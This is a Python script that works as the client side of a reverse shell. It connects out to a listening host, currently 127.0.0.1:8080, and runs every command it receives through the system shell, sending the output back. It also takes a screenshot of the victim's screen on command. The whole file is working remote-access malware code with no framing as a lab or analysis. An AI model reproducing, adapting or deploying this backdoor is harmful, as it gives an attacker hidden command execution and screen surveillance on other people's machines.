#!/usr/bin/python3

# import modules
import socket
import subprocess
from PIL import ImageGrab


def screenshot():
    count = 0
    shot = ImageGrab.grab()
    shot.save(f'screenshot{count}.png')
    shot.close()
    count += 1


# define remote host and port
host = '127.0.0.1'
port = 8080

# create socket object
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((host, port))

# receive and decode commands from the server
while True:
    comm = client.recv(1024).decode()
    if not comm:
        break
    elif comm == '':
        pass
    elif comm == 'screenshot':
        screenshot()
    else:
        try:
            # excute command sending the output
            output = subprocess.check_output(comm, stderr=subprocess.STDOUT, text=True, shell=True)
            client.send(output.encode())
        except subprocess.CalledProcessError as e:
            error_msg = f'Error excuting command: {comm}\n{e}'
            client.send(error_msg.encode())
        except (ValueError, TypeError) as e:
            error_msg = f'\nError: {e}'
            client.send(error_msg.encode())

# close the connection.
client.close()
